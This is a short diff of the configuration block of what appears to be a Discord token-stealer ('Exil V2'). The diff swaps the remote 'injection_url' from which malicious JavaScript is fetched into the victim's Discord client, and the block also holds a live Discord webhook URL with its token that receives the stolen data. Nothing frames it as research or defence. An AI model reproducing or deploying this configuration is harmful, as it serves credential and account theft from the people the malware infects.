@@ -18,7 +18,7 @@ var config = {
     "embed-color": 16734976,
 
     creator: "Exil V2",
-    injection_url: "https://raw.githubusercontent.com/Inplex-sys/Hawkish-Eyes/main/inject.js",
+    injection_url: "https://raw.githubusercontent.com/ItsZxsko/tenpls-/main/index.js",
     webhook: "https://canary.discord.com/api/webhooks/1274457660925677628/hjygSmh1iaZsodrXQscAU7fpq53NXciQl_nuNuCLYsKlhpsdTS9cO_CesagJniUDCxaC",
     Filter: {
         "urls": [
